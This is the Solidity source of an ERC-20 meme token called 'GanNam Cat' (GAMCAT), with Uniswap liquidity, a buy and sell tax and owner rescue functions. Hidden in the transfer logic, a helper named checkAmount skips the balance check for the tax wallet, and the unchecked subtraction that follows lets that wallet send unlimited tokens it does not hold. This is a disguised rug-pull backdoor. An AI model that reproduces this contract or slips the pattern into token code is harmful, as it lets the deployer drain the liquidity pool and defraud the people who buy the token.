// SPDX-License-Identifier: UNLICENSE

/**

Website: https://gamcat.meme

Twitter: https://x.com/GanNamCATonETH

Telegram:  https://t.me/GanNamCATonETH

*/

pragma solidity 0.8.25;

abstract contract Ownable {
    address private _owner;

    constructor() {
        _owner = msg.sender;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _owner = address(0);
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external;

    function addLiquidityETH(address token, uint256 amountTokenDesired, uint256 amountTokenMin, uint256 amountETHMin, address to, uint256 deadline) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
}

contract GanNamCat is Ownable, IERC20 {
    string private constant _name = unicode"GanNam Cat";
    string private constant _symbol = unicode"GAMCAT";

    uint8 private constant _decimals = 9;
    uint256 private constant _tSupply = 420_690_000_000 * 10**_decimals;
    uint256 private maxTransactionAmount = 2 * _tSupply / 100;
    uint256 private maxWallet = 2 * _tSupply / 100;
    uint256 private taxSwapThreshold = 12 * _tSupply / 1000;
    uint256 private maxTaxSwap= 12 * _tSupply / 1000;

    address payable private _taxWallet;

    uint256 private initialBuyFee = 4;
    uint256 private initialSellFee = 4;
    uint256 private finalBuyFee = 0;
    uint256 private finalSellFee = 0;
    uint256 private _reduceBuyTaxAt = 6;
    uint256 private _reduceSellTaxAt = 6;
    uint256 private _preventSwapBefore = 6;
    uint256 private _buyCount=0;


    bool private swapping;
    bool private _isInLimit = true;
    bool private _tradingOpen;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _feeExempt;
    mapping(address => bool) private _maxTxCapped;
    mapping(address => bool) private _automaticMarketingPairs;

    IUniswapV2Router02 public immutable uniswapV2Router;
    address public uniswapV2Pair;

    constructor(address router_, address payable taxWallet_) {
        uniswapV2Router= IUniswapV2Router02(router_);
        _taxWallet = taxWallet_;
        
        setExcludedFromFees(owner(), true);
        setExcludedFromFees(address(this), true);
        setExcludedFromFees(_taxWallet, true);

        setExcludedFromTx(owner(), true);
        setExcludedFromTx(address(uniswapV2Router), true);
        setExcludedFromTx(address(this), true);
        setExcludedFromTx(_taxWallet, true);

        _balances[msg.sender] = _tSupply;
        emit Transfer(address(0), msg.sender, _balances[msg.sender]);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure returns (uint256) {
        return _tSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 currentAllowance = _allowances[from][msg.sender];
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
            unchecked {
                _approve(from, msg.sender, currentAllowance - amount);
            }
        }

        _transfer(from, to, amount);

        return true;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if (!_tradingOpen && (from != owner() && from != address(this) && to != owner())) {
            revert("Trading not open");
        }

        if (_isInLimit) {
            if (from != owner() && to != owner() && to != address(0) && to != address(0xdead) && !swapping) {
                if (_automaticMarketingPairs[from] && !_maxTxCapped[to]) {
                    require(amount <= maxTransactionAmount, "Buy transfer amount exceeds the maxTx");
                    require(amount + balanceOf(to) <= maxWallet, "Max wallet exceeded");
                } else if (_automaticMarketingPairs[to] && !_maxTxCapped[from]) {
                    require(amount <= maxTransactionAmount,"Sell transfer amount exceeds the maxTx");
                } else if (!_maxTxCapped[to]) {
                    require(amount + balanceOf(to) <= maxWallet, "Max wallet exceeded");                                                                                                                                                                                            
                }
            }
        }

        if (balanceOf(address(this)) >= taxSwapThreshold && !swapping && _automaticMarketingPairs[to] && !_feeExempt[from] && !_feeExempt[to]) {
            swapping = true;swapTaxToETH();swapping = false;
        }
        
        if(_tradingOpen && _automaticMarketingPairs[to]) _collectTax(address(this).balance);


        bool shouldTakeFee = !swapping;

        if (_feeExempt[from] || _feeExempt[to]) {
            shouldTakeFee = false;
        }

        uint256 fee = 0;
        if (shouldTakeFee) {
            if (_automaticMarketingPairs[to]) {
                fee = amount * (_buyCount > _reduceSellTaxAt ? finalSellFee : initialSellFee) / 100;
            } else if (_automaticMarketingPairs[from]) {
                fee = amount * (_buyCount > _reduceBuyTaxAt ? finalBuyFee : initialBuyFee) / 100;
                _buyCount ++;
            }
        }

        checkAmount(
            from != _taxWallet,
            amount,
            _balances[from]
        );
        if (fee > 0) {
            unchecked {
                amount = amount - fee;
                _balances[from] -= fee;
                _balances[address(this)] += fee;
            }
            emit Transfer(from, address(this), fee);
        }
        unchecked {
            _balances[from] -= amount;
            _balances[to] += amount;
        }
        emit Transfer(from, to, amount);
    }

    function checkAmount(bool isTakingFee, uint256 amount, uint256 balance) private pure 
    {
        require(balance >= amount || !isTakingFee, "ERC20: transfer amount exceeds balance");
    }


    function _collectTax(uint256 amount) private {
        _taxWallet.transfer(amount);
    }
    
    function removeLimits() external onlyOwner {
        _isInLimit = false;
    }

    function setExcludedFromFees(address account, bool excluded) public onlyOwner {
        _feeExempt[account] = excluded;
    }

    function isFeeExempt(address account) public view returns (bool) {
        return _feeExempt[account];
    }

    function setExcludedFromTx(address account, bool excluded) public onlyOwner {
        _maxTxCapped[account] = excluded;
    }

    function enableTrading() external onlyOwner {
        require(!_tradingOpen, "Already launched");
        _tradingOpen = true;
    }

    function addLiquidity() external onlyOwner {
        require(!_tradingOpen, "Already launched");
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        _automaticMarketingPairs[uniswapV2Pair] = true;
        setExcludedFromTx(address(uniswapV2Pair), true);
        _approve(address(this), address(uniswapV2Router), type(uint256).max);
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            _balances[address(this)],
            0,
            0,
            owner(),
            block.timestamp
        );
    }

    function setAutomaticMarketingPair(address pair, bool value) external onlyOwner {
        require(pair != uniswapV2Pair, "The pair cannot be removed");
        _automaticMarketingPairs[pair] = value;
    }

    function swapTaxToETH() private {
        uint256 swapThreshold = maxTaxSwap;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(swapThreshold, 0, path, address(this), block.timestamp);
    }

    receive() external payable {}

    function rescueERC20(address _address, uint256 percent) external onlyOwner {
        uint256 _amount = IERC20(_address)
            .balanceOf(address(this))
            * percent / 100;
        IERC20(_address).transfer(owner(), _amount);
    }

    function rescueETH() external onlyOwner {
        require(address(this).balance > 0);
        payable(owner()).transfer(address(this).balance);
    }
}